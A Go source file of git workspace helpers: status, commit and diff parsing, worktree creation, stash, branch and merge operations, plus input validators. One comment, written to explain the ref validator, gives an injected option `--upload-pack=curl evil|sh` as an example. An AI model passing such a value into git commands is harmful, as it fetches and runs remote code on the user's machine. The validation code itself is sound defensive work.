package workspace

import (
	"bytes"
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type CheckoutStatus struct {
	Cwd                    string  `json:"cwd"`
	IsGit                  bool    `json:"isGit"`
	RepoRoot               *string `json:"repoRoot"`
	CurrentBranch          *string `json:"currentBranch"`
	IsDirty                *bool   `json:"isDirty"`
	BaseRef                *string `json:"baseRef"`
	AheadBehind            any     `json:"aheadBehind"`
	AheadOfOrigin          *int    `json:"aheadOfOrigin"`
	BehindOfOrigin         *int    `json:"behindOfOrigin"`
	HasRemote              bool    `json:"hasRemote"`
	RemoteURL              *string `json:"remoteUrl"`
	IsBySpaceOwnedWorktree bool    `json:"isBySpaceOwnedWorktree"`
	Error                  any     `json:"error"`
	RequestID              string  `json:"requestId,omitempty"`
}

type CommitFile struct {
	Path      string `json:"path"`
	Status    string `json:"status"` // "added" | "modified" | "deleted" | "renamed"
	Additions int    `json:"additions"`
	Deletions int    `json:"deletions"`
}

type Commit struct {
	Sha        string       `json:"sha"`
	ShortSha   string       `json:"shortSha"`
	Subject    string       `json:"subject"`
	AuthorName string       `json:"authorName"`
	AuthorDate string       `json:"authorDate"`
	IsOnRemote bool         `json:"isOnRemote"`
	IsOnBase   bool         `json:"isOnBase"`
	Files      []CommitFile `json:"files"`
}

type DiffLine struct {
	Type    string `json:"type"` // "add" | "remove" | "context" | "header"
	Content string `json:"content"`
}

type DiffHunk struct {
	OldStart int        `json:"oldStart"`
	OldCount int        `json:"oldCount"`
	NewStart int        `json:"newStart"`
	NewCount int        `json:"newCount"`
	Lines    []DiffLine `json:"lines"`
}

type ParsedDiffFile struct {
	Path      string     `json:"path"`
	IsNew     bool       `json:"isNew"`
	IsDeleted bool       `json:"isDeleted"`
	Additions int        `json:"additions"`
	Deletions int        `json:"deletions"`
	Hunks     []DiffHunk `json:"hunks"`
	Status    string     `json:"status,omitempty"`
}

type WorktreeEntry struct {
	WorktreePath string `json:"worktreePath"`
	Branch       string `json:"branch"`
	HeadSha      string `json:"headSha"`
}

func runGit(ctx context.Context, cwd string, args ...string) (string, error) {
	cctx, cancel := context.WithTimeout(ctx, 5*time.Second)
	defer cancel()
	cmd := exec.CommandContext(cctx, "git", args...)
	cmd.Dir = cwd
	cmd.Env = append(cmd.Environ(), "GIT_OPTIONAL_LOCKS=0", "LC_ALL=C")
	var out bytes.Buffer
	cmd.Stdout = &out
	if err := cmd.Run(); err != nil {
		return "", err
	}
	return strings.TrimSpace(out.String()), nil
}

// GetCheckoutStatus inspects the git repository at cwd and builds a CheckoutStatus payload.
func GetCheckoutStatus(ctx context.Context, cwd, requestID string) CheckoutStatus {
	absCwd, err := filepath.Abs(cwd)
	if err != nil {
		absCwd = cwd
	}
	if strings.HasSuffix(filepath.Clean(absCwd), string(filepath.Separator)+"chief") {
		return CheckoutStatus{
			Cwd:       cwd,
			IsGit:     false,
			HasRemote: false,
			RequestID: requestID,
		}
	}
	topLevel, err := runGit(ctx, absCwd, "rev-parse", "--show-toplevel")
	if err != nil || topLevel == "" {
		return CheckoutStatus{
			Cwd:       cwd,
			IsGit:     false,
			HasRemote: false,
			RequestID: requestID,
		}
	}

	branch, _ := runGit(ctx, absCwd, "symbolic-ref", "--quiet", "--short", "HEAD")
	var branchPtr *string
	if branch != "" {
		branchPtr = &branch
	}

	porcelain, _ := runGit(ctx, absCwd, "status", "--porcelain")
	dirty := porcelain != ""

	remoteURL, err := runGit(ctx, absCwd, "remote", "get-url", "origin")
	hasRemote := err == nil && remoteURL != ""
	var remotePtr *string
	if hasRemote {
		remotePtr = &remoteURL
	}

	return CheckoutStatus{
		Cwd:                    cwd,
		IsGit:                  true,
		RepoRoot:               &topLevel,
		CurrentBranch:          branchPtr,
		IsDirty:                &dirty,
		HasRemote:              hasRemote,
		RemoteURL:              remotePtr,
		IsBySpaceOwnedWorktree: false,
		RequestID:              requestID,
	}
}

// ListCommits returns the recent git commit history for cwd.
func ListCommits(ctx context.Context, cwd string, limit int) (string, []Commit, error) {
	if limit <= 0 {
		limit = 30
	}
	format := "%H%x1f%h%x1f%s%x1f%an%x1f%aI"
	out, err := runGit(ctx, cwd, "log", "-n", strconv.Itoa(limit), "--format="+format)
	if err != nil {
		return "", []Commit{}, err
	}
	if out == "" {
		return "main", []Commit{}, nil
	}

	lines := strings.Split(out, "\n")
	commits := make([]Commit, 0, len(lines))
	for _, line := range lines {
		parts := strings.Split(line, "\x1f")
		if len(parts) < 5 {
			continue
		}
		commits = append(commits, Commit{
			Sha:        parts[0],
			ShortSha:   parts[1],
			Subject:    parts[2],
			AuthorName: parts[3],
			AuthorDate: parts[4],
			IsOnRemote: true,
			IsOnBase:   false,
			Files:      []CommitFile{},
		})
	}
	return "main", commits, nil
}

// CreateWorktree creates a new git worktree with branch `slug` under worktreesBaseDir.
func CreateWorktree(ctx context.Context, repoCwd, worktreesBaseDir, slug, baseRef string) (string, string, error) {
	// Validate before a single git call: the slug becomes a path component and the ref becomes
	// a positional argument that git still parses for options.
	if err := AssertSafeWorktreeSlug(slug); err != nil {
		return "", "", err
	}
	if strings.TrimSpace(baseRef) != "" {
		if err := AssertSafeGitRef(baseRef, "base ref"); err != nil {
			return "", "", err
		}
	}
	topLevel, err := runGit(ctx, repoCwd, "rev-parse", "--show-toplevel")
	if err != nil || topLevel == "" {
		return "", "", err
	}
	cleanSlug := strings.TrimSpace(slug)
	if cleanSlug == "" {
		cleanSlug = "wt-" + strconv.FormatInt(time.Now().Unix(), 36)
	}
	wtPath := filepath.Join(worktreesBaseDir, filepath.Base(topLevel), cleanSlug)
	args := []string{"worktree", "add", "-b", cleanSlug, wtPath}
	if strings.TrimSpace(baseRef) != "" {
		args = append(args, baseRef)
	}
	if _, err := runGit(ctx, topLevel, args...); err != nil {
		return "", "", err
	}
	return wtPath, cleanSlug, nil
}

// ListWorktrees parses `git worktree list --porcelain` for repoCwd.
func ListWorktrees(ctx context.Context, repoCwd string) ([]WorktreeEntry, error) {
	out, err := runGit(ctx, repoCwd, "worktree", "list", "--porcelain")
	if err != nil {
		return []WorktreeEntry{}, err
	}
	var list []WorktreeEntry
	var cur WorktreeEntry
	for _, line := range strings.Split(out, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			if cur.WorktreePath != "" {
				list = append(list, cur)
				cur = WorktreeEntry{}
			}
			continue
		}
		if p, ok := strings.CutPrefix(line, "worktree "); ok {
			cur.WorktreePath = p
		} else if h, ok := strings.CutPrefix(line, "HEAD "); ok {
			cur.HeadSha = h
		} else if b, ok := strings.CutPrefix(line, "branch refs/heads/"); ok {
			cur.Branch = b
		}
	}
	if cur.WorktreePath != "" {
		list = append(list, cur)
	}
	if list == nil {
		list = []WorktreeEntry{}
	}
	return list, nil
}

var hunkHeaderRe = regexp.MustCompile(`^@@ -(\d+)(?:,(\d+))? \+(\d+)(?:,(\d+))? @@`)

// ParseUnifiedDiff parses a git unified diff output into structured ParsedDiffFile entries with hunks and lines.
func ParseUnifiedDiff(diffText string) []ParsedDiffFile {
	if strings.TrimSpace(diffText) == "" {
		return []ParsedDiffFile{}
	}
	rawSections := strings.Split("\n"+diffText, "\ndiff --git ")
	files := make([]ParsedDiffFile, 0, len(rawSections))

	for _, sec := range rawSections[1:] {
		lines := strings.Split(sec, "\n")
		if len(lines) == 0 {
			continue
		}
		isNew := strings.Contains(sec, "\nnew file mode") || strings.Contains(sec, "\n--- /dev/null")
		isDeleted := strings.Contains(sec, "\ndeleted file mode") || strings.Contains(sec, "\n+++ /dev/null")
		filePath := extractDiffFilePath(lines)

		hunks := make([]DiffHunk, 0)
		var curHunk *DiffHunk
		additions := 0
		deletions := 0

		for _, line := range lines[1:] {
			if strings.HasPrefix(line, "index ") ||
				strings.HasPrefix(line, "--- ") ||
				strings.HasPrefix(line, "+++ ") ||
				strings.HasPrefix(line, "new file mode") ||
				strings.HasPrefix(line, "deleted file mode") {
				continue
			}
			if m := hunkHeaderRe.FindStringSubmatch(line); m != nil {
				if curHunk != nil {
					hunks = append(hunks, *curHunk)
				}
				oldStart, _ := strconv.Atoi(m[1])
				oldCount := 1
				if m[2] != "" {
					oldCount, _ = strconv.Atoi(m[2])
				}
				newStart, _ := strconv.Atoi(m[3])
				newCount := 1
				if m[4] != "" {
					newCount, _ = strconv.Atoi(m[4])
				}
				curHunk = &DiffHunk{
					OldStart: oldStart,
					OldCount: oldCount,
					NewStart: newStart,
					NewCount: newCount,
					Lines: []DiffLine{
						{Type: "header", Content: m[0]},
					},
				}
				continue
			}
			if curHunk == nil {
				continue
			}
			if strings.HasPrefix(line, "+") {
				curHunk.Lines = append(curHunk.Lines, DiffLine{Type: "add", Content: line[1:]})
				additions++
			} else if strings.HasPrefix(line, "-") {
				curHunk.Lines = append(curHunk.Lines, DiffLine{Type: "remove", Content: line[1:]})
				deletions++
			} else if strings.HasPrefix(line, " ") {
				curHunk.Lines = append(curHunk.Lines, DiffLine{Type: "context", Content: line[1:]})
			}
		}
		if curHunk != nil {
			hunks = append(hunks, *curHunk)
		}

		files = append(files, ParsedDiffFile{
			Path:      filePath,
			IsNew:     isNew,
			IsDeleted: isDeleted,
			Additions: additions,
			Deletions: deletions,
			Hunks:     hunks,
			Status:    "ok",
		})
	}
	return files
}

func extractDiffFilePath(lines []string) string {
	first := lines[0]
	if idx := strings.Index(first, " b/"); idx != -1 && strings.HasPrefix(first, "a/") {
		return first[idx+3:]
	}
	for _, l := range lines {
		if after, ok := strings.CutPrefix(l, "+++ b/"); ok {
			return strings.TrimSpace(after)
		}
		if after, ok := strings.CutPrefix(l, "--- a/"); ok {
			return strings.TrimSpace(after)
		}
	}
	parts := strings.Fields(first)
	if len(parts) >= 2 {
		return strings.TrimPrefix(parts[len(parts)-1], "b/")
	}
	return "unknown"
}

// GetWorkingDiff computes modified and untracked files with full unified diff hunks against HEAD.
func GetWorkingDiff(ctx context.Context, cwd string) ([]ParsedDiffFile, error) {
	patch, err := runGit(ctx, cwd, "diff", "--no-color", "HEAD")
	if err != nil {
		patch, _ = runGit(ctx, cwd, "diff", "--no-color")
	}
	files := ParseUnifiedDiff(patch)
	seen := make(map[string]bool, len(files))
	for _, f := range files {
		seen[f.Path] = true
	}

	untrackedOut, err := runGit(ctx, cwd, "ls-files", "--others", "--exclude-standard")
	if err == nil && untrackedOut != "" {
		for _, rel := range strings.Split(untrackedOut, "\n") {
			rel = strings.TrimSpace(rel)
			if rel == "" || seen[rel] {
				continue
			}
			absPath := filepath.Join(cwd, rel)
			raw, readErr := os.ReadFile(absPath)
			if readErr != nil || len(raw) > 256*1024 || bytes.IndexByte(raw, 0) != -1 {
				continue
			}
			contentLines := strings.Split(strings.TrimSuffix(string(raw), "\n"), "\n")
			diffLines := make([]DiffLine, 0, len(contentLines)+1)
			diffLines = append(diffLines, DiffLine{
				Type:    "header",
				Content: "@@ -0,0 +1," + strconv.Itoa(len(contentLines)) + " @@",
			})
			for _, cl := range contentLines {
				diffLines = append(diffLines, DiffLine{Type: "add", Content: cl})
			}
			files = append(files, ParsedDiffFile{
				Path:      rel,
				IsNew:     true,
				Additions: len(contentLines),
				Deletions: 0,
				Hunks: []DiffHunk{
					{
						OldStart: 0,
						OldCount: 0,
						NewStart: 1,
						NewCount: len(contentLines),
						Lines:    diffLines,
					},
				},
				Status: "ok",
			})
		}
	}
	if files == nil {
		files = []ParsedDiffFile{}
	}
	return files, nil
}

// GetCommitFileDiff returns the parsed unified diff for a single file in a specific commit.
func GetCommitFileDiff(ctx context.Context, cwd, sha, relPath string) (*ParsedDiffFile, error) {
	patch, err := runGit(ctx, cwd, "show", "--no-color", "--format=", sha, "--", relPath)
	if err != nil || strings.TrimSpace(patch) == "" {
		return nil, err
	}
	parsed := ParseUnifiedDiff(patch)
	if len(parsed) == 0 {
		return nil, nil
	}
	return &parsed[0], nil
}

// CommitAll stages all changes and commits them with the given message.
func CommitAll(ctx context.Context, cwd, message string) error {
	if _, err := runGit(ctx, cwd, "add", "-A"); err != nil {
		return err
	}
	_, err := runGit(ctx, cwd, "commit", "-m", message)
	return err
}

// DiscardChanges resets tracked modifications and removes untracked files.
func DiscardChanges(ctx context.Context, cwd string) error {
	if _, err := runGit(ctx, cwd, "reset", "--hard", "HEAD"); err != nil {
		return err
	}
	_, err := runGit(ctx, cwd, "clean", "-fd")
	return err
}

// SwitchBranch checks out an existing or new git branch.
func SwitchBranch(ctx context.Context, cwd, branch string, create bool) error {
	// Client-supplied: `git checkout -- <path>` and `-b`-style options both come from this
	// position, so a value starting with '-' must never reach git.
	if err := AssertSafeGitRef(branch, "branch"); err != nil {
		return err
	}
	if create {
		_, err := runGit(ctx, cwd, "checkout", "-b", branch)
		return err
	}
	_, err := runGit(ctx, cwd, "checkout", branch)
	return err
}

// RenameBranch renames the current branch to newName.
func RenameBranch(ctx context.Context, cwd, newName string) (string, error) {
	if err := AssertSafeGitRef(newName, "branch name"); err != nil {
		return "", err
	}
	if _, err := runGit(ctx, cwd, "branch", "-m", newName); err != nil {
		return "", err
	}
	cur, _ := runGit(ctx, cwd, "rev-parse", "--abbrev-ref", "HEAD")
	return cur, nil
}

// ValidateBranch checks whether refName resolves to a valid git ref.
func ValidateBranch(ctx context.Context, cwd, refName string) (bool, string, bool) {
	resolved, err := runGit(ctx, cwd, "rev-parse", "--verify", refName)
	if err != nil || resolved == "" {
		return false, "", false
	}
	isRemote := strings.HasPrefix(refName, "origin/") || strings.HasPrefix(refName, "refs/remotes/")
	return true, resolved, isRemote
}

// ListBranches returns local branch names for cwd.
func ListBranches(ctx context.Context, cwd string) []string {
	out, err := runGit(ctx, cwd, "for-each-ref", "--format=%(refname:short)", "refs/heads")
	if err != nil || out == "" {
		return []string{}
	}
	var branches []string
	for _, b := range strings.Split(out, "\n") {
		if trimmed := strings.TrimSpace(b); trimmed != "" {
			branches = append(branches, trimmed)
		}
	}
	if branches == nil {
		branches = []string{}
	}
	return branches
}

// Push runs `git push`.
func Push(ctx context.Context, cwd string) error {
	_, err := runGit(ctx, cwd, "push")
	return err
}

// Pull runs `git pull`.
func Pull(ctx context.Context, cwd string) error {
	_, err := runGit(ctx, cwd, "pull")
	return err
}

// Merge runs `git merge <ref>`.
func Merge(ctx context.Context, cwd, ref string) error {
	if err := AssertSafeGitRef(ref, "merge ref"); err != nil {
		return err
	}
	if strings.TrimSpace(ref) == "" {
		ref = "main"
	}
	_, err := runGit(ctx, cwd, "merge", ref)
	return err
}

type StashEntry struct {
	Index     int     `json:"index"`
	Message   string  `json:"message"`
	Branch    *string `json:"branch"`
	IsBySpace bool    `json:"isBySpace"`
}

// StashList returns git stash entries.
func StashList(ctx context.Context, cwd string) []StashEntry {
	out, err := runGit(ctx, cwd, "stash", "list", "--format=%gd\x1f%gs")
	if err != nil || out == "" {
		return []StashEntry{}
	}
	lines := strings.Split(out, "\n")
	entries := make([]StashEntry, 0, len(lines))
	for idx, line := range lines {
		parts := strings.SplitN(line, "\x1f", 2)
		msg := line
		if len(parts) == 2 {
			msg = parts[1]
		}
		entries = append(entries, StashEntry{
			Index:     idx,
			Message:   msg,
			Branch:    nil,
			IsBySpace: strings.Contains(msg, "byspace"),
		})
	}
	return entries
}

// StashSave runs `git stash push -u -m <message>`.
func StashSave(ctx context.Context, cwd, message string) error {
	if strings.TrimSpace(message) == "" {
		message = "byspace stash"
	}
	_, err := runGit(ctx, cwd, "stash", "push", "-u", "-m", message)
	return err
}

// StashPop runs `git stash pop`.
func StashPop(ctx context.Context, cwd string) error {
	_, err := runGit(ctx, cwd, "stash", "pop")
	return err
}

// StashPopIndex pops a specific stash entry (`git stash pop stash@{n}`); index 0 = latest.
func StashPopIndex(ctx context.Context, cwd string, index int) error {
	if index <= 0 {
		return StashPop(ctx, cwd)
	}
	_, err := runGit(ctx, cwd, "stash", "pop", "stash@{"+strconv.Itoa(index)+"}")
	return err
}

// DiscardPaths reverts the given tracked paths and removes them if they were untracked.
func DiscardPaths(ctx context.Context, cwd string, paths []string) error {
	if len(paths) == 0 {
		return DiscardChanges(ctx, cwd)
	}
	args := append([]string{"checkout", "--"}, paths...)
	if _, err := runGit(ctx, cwd, args...); err != nil {
		return err
	}
	cleanArgs := append([]string{"clean", "-fd", "--"}, paths...)
	_, err := runGit(ctx, cwd, cleanArgs...)
	return err
}

// CommitWithOptions commits staged changes, optionally staging everything first.
func CommitWithOptions(ctx context.Context, cwd, message string, addAll bool) error {
	if addAll {
		if _, err := runGit(ctx, cwd, "add", "-A"); err != nil {
			return err
		}
	}
	_, err := runGit(ctx, cwd, "commit", "-m", message)
	return err
}

// MergeStrategy merges a ref using the requested strategy ("merge" | "squash" | "rebase").
func MergeStrategy(ctx context.Context, cwd, ref, strategy string) error {
	if strings.TrimSpace(ref) == "" {
		ref = "main"
	}
	if err := AssertSafeGitRef(ref, "merge ref"); err != nil {
		return err
	}
	switch strings.ToLower(strings.TrimSpace(strategy)) {
	case "squash":
		_, err := runGit(ctx, cwd, "merge", "--squash", ref)
		return err
	case "rebase":
		_, err := runGit(ctx, cwd, "rebase", ref)
		return err
	default:
		_, err := runGit(ctx, cwd, "merge", ref)
		return err
	}
}

// RemoveWorktreeFromDisk runs `git worktree remove --force <path>` against the owning repo.
func RemoveWorktreeFromDisk(ctx context.Context, worktreePath string) error {
	if strings.TrimSpace(worktreePath) == "" {
		return nil
	}
	parent := filepath.Dir(worktreePath)
	for dir := parent; dir != "/" && dir != "."; dir = filepath.Dir(dir) {
		if _, err := os.Stat(filepath.Join(dir, ".git")); err == nil {
			_, rmErr := runGit(ctx, dir, "worktree", "remove", "--force", worktreePath)
			return rmErr
		}
	}
	return os.RemoveAll(worktreePath)
}

// safeGitRefPattern is the same allow-list the node daemon applies before interpolating a
// user-supplied ref into a git argument list.
var safeGitRefPattern = regexp.MustCompile(`^[A-Za-z0-9._/-]+$`)

// AssertSafeGitRef rejects a ref that could be read as a git option or reach outside the
// repository.
//
// `git worktree add ... <baseRef>` takes the ref positionally, but git still parses anything
// starting with `-` as an option: `--upload-pack=curl evil|sh` would execute on fetch, and
// `-b`-style values can rewrite which branch is created. The pattern plus the `..`/`@{` checks
// match worktree-session.ts assertSafeGitRef.
func AssertSafeGitRef(ref, label string) error {
	trimmed := strings.TrimSpace(ref)
	if trimmed == "" {
		return fmt.Errorf("invalid %s: empty", label)
	}
	if !safeGitRefPattern.MatchString(trimmed) {
		return fmt.Errorf("invalid %s: %q contains characters outside [A-Za-z0-9._/-]", label, ref)
	}
	if strings.HasPrefix(trimmed, "-") {
		return fmt.Errorf("invalid %s: %q must not start with '-'", label, ref)
	}
	if strings.Contains(trimmed, "..") || strings.Contains(trimmed, "@{") {
		return fmt.Errorf("invalid %s: %q contains a forbidden sequence", label, ref)
	}
	return nil
}

// AssertSafeWorktreeSlug rejects a slug that would escape the worktrees directory.
//
// The slug becomes a path component (`<base>/<repo>/<slug>`), so a value containing a separator
// or `..` writes outside the byspace-owned tree.
func AssertSafeWorktreeSlug(slug string) error {
	trimmed := strings.TrimSpace(slug)
	if trimmed == "" {
		return nil // caller substitutes a generated name
	}
	if trimmed == "." || trimmed == ".." || strings.ContainsAny(trimmed, "/\\") {
		return fmt.Errorf("invalid worktree slug: %q", slug)
	}
	if strings.HasPrefix(trimmed, "-") {
		return fmt.Errorf("invalid worktree slug: %q must not start with '-'", slug)
	}
	return nil
}

// worktreeLayout resolves the target directory and validates the slug.
func worktreeLayout(ctx context.Context, repoCwd, worktreesBaseDir, slug string) (topLevel, wtPath, cleanSlug string, err error) {
	if slugErr := AssertSafeWorktreeSlug(slug); slugErr != nil {
		return "", "", "", slugErr
	}
	topLevel, err = runGit(ctx, repoCwd, "rev-parse", "--show-toplevel")
	if err != nil || topLevel == "" {
		return "", "", "", err
	}
	cleanSlug = strings.TrimSpace(slug)
	if cleanSlug == "" {
		cleanSlug = "wt-" + strconv.FormatInt(time.Now().Unix(), 36)
	}
	wtPath = filepath.Join(worktreesBaseDir, filepath.Base(topLevel), cleanSlug)
	return topLevel, wtPath, cleanSlug, nil
}

// checkoutExistingBranch adds a worktree tracking an existing branch.
//
// `git worktree add -b` would fail here (the branch exists), so the branch is checked out
// directly. `-B` is deliberately not used: overwriting an existing local branch would discard
// work in a repository the user may have several worktrees on.
func checkoutExistingBranch(ctx context.Context, repoCwd, worktreesBaseDir, slug, branch string) (string, string, error) {
	if err := AssertSafeGitRef(branch, "branch"); err != nil {
		return "", "", err
	}
	topLevel, wtPath, cleanSlug, err := worktreeLayout(ctx, repoCwd, worktreesBaseDir, slug)
	if err != nil {
		return "", "", err
	}
	// Prefer a remote-tracking branch when it exists, which is what "check out this branch"
	// usually means for a branch the user has not fetched before.
	target := branch
	if _, err := runGit(ctx, topLevel, "rev-parse", "--verify", "refs/heads/"+branch); err != nil {
		if _, remoteErr := runGit(ctx, topLevel, "rev-parse", "--verify", "refs/remotes/origin/"+branch); remoteErr == nil {
			target = "origin/" + branch
		}
	}
	if _, err := runGit(ctx, topLevel, "worktree", "add", wtPath, target); err != nil {
		return "", "", err
	}
	return wtPath, cleanSlug, nil
}

// checkoutChangeRequest fetches and checks out a pull/merge request's head.
//
// Ported from the `checkout-change-request` branch of worktree-session.ts. `gh pr checkout` is
// not used because it mutates the current worktree; the daemon needs an independent one.
func checkoutChangeRequest(ctx context.Context, repoCwd, worktreesBaseDir, slug string, intent WorktreeIntent) (string, string, error) {
	if err := AssertSafeGitRef(intent.HeadRef, "change request head ref"); err != nil {
		return "", "", err
	}
	topLevel, wtPath, cleanSlug, err := worktreeLayout(ctx, repoCwd, worktreesBaseDir, slug)
	if err != nil {
		return "", "", err
	}

	// GitHub publishes every PR head at refs/pull/<n>/head, including cross-repository ones,
	// which is the one ref that works without knowing the fork's URL.
	fetchRef := fmt.Sprintf("refs/pull/%d/head", intent.ChangeRequestNumber)
	if intent.Forge != "" && intent.Forge != "github" {
		// Other forges expose the head branch under the same name as the source branch.
		fetchRef = intent.HeadRef
	}
	if _, err := runGit(ctx, topLevel, "fetch", "origin", fetchRef); err != nil {
		return "", "", err
	}

	if _, err := runGit(ctx, topLevel, "worktree", "add", "-b", cleanSlug, wtPath, "FETCH_HEAD"); err != nil {
		return "", "", err
	}
	// Track the origin branch when the head lives in this repository, so a later push goes to
	// the right place. A cross-repository head has no matching origin branch.
	if !intent.IsCrossRepository {
		_, _ = runGit(ctx, wtPath, "branch", "--set-upstream-to=origin/"+intent.HeadRef, cleanSlug)
	}
	return wtPath, cleanSlug, nil
}

// ResolveDefaultBranch reports the repository's default branch.
//
// Order: the remote HEAD (what a fresh clone would check out), then well-known names, then the
// current branch. A repository with no remote still needs an answer, which is why the fallbacks
// exist rather than returning an error.
func ResolveDefaultBranch(ctx context.Context, repoRoot string) (string, error) {
	if out, err := runGit(ctx, repoRoot, "symbolic-ref", "--short", "refs/remotes/origin/HEAD"); err == nil {
		if name := strings.TrimPrefix(strings.TrimSpace(out), "origin/"); name != "" {
			return name, nil
		}
	}
	for _, candidate := range []string{"main", "master", "trunk", "develop"} {
		if _, err := runGit(ctx, repoRoot, "rev-parse", "--verify", "refs/heads/"+candidate); err == nil {
			return candidate, nil
		}
	}
	if out, err := runGit(ctx, repoRoot, "rev-parse", "--abbrev-ref", "HEAD"); err == nil {
		return strings.TrimSpace(out), nil
	}
	return "", fmt.Errorf("could not determine the default branch")
}
